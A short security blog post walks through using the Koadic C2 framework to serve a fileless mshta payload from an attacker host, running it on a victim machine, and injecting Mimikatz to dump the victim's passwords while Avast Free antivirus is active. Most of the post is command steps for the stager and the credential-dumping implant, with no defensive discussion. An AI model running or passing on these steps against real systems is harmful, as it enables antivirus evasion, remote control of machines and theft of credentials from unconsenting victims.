---
title: " Inject Mimikatz with Koadic using fileless mshta with Avast Free protection ON "
date: "2020-02-26"
layout: single
tags:
- Fileless
categories:
- Blog-post
---

Watch video tutorial here: [Video](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/videos/mimikatz%20with%20koadic.mp4)

We are using js/mshta module as it will serves payloads in memory using MSHTA.exe HTML Applications for us. This poc is test on Avast Free AV and koadic managed to dump the password using Mimikatz implant.

Run koadic and create our payload:

    ./koadic
    use stager/js/mshta
    set srvhost [attacker ip]
    run

Copy the command line and paste on victim machine.

Run mimikatz_dotnet2js:

    use implant/inject/mimikatz_dotnet2js
    set zombie 0
    run

As you can see, we can dump victim's password using this mimikatz module.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mimikatz_koadic.PNG)
